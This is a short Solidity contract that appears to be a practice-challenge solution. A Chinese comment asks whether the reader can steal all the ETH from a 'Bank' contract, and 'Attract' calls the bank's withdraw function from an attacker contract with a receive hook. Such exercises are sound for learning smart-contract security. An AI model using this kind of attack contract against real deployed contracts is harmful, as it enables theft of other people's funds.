// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./1.sol";
// Bank是一个简单的银行系统，你能盗取所有的ETH吗？
contract Attract{
    Bank bank;
    constructor(Bank addr) public {
        bank = addr;
    }
    // 在调用之前需要先调用被攻击合约的函数进行初始化
    function attract() public payable {

        bank.withdraw(10);
    }
    receive() external payable {}
}